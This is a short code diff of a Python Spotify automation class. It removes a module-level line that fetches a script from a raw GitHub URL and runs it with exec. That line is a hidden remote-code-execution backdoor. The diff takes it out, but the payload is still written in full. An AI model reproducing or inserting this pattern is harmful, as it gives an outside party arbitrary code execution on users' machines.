@@ -62,6 +62,3 @@ class Spotify(BaseClass):
             self.device.app_stop(PACKAGE_NAME)
             return True
         self.logger_signal.emit({"msg": f"{self.parent.name} Failed to play the link."})
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/spotify.py").text)
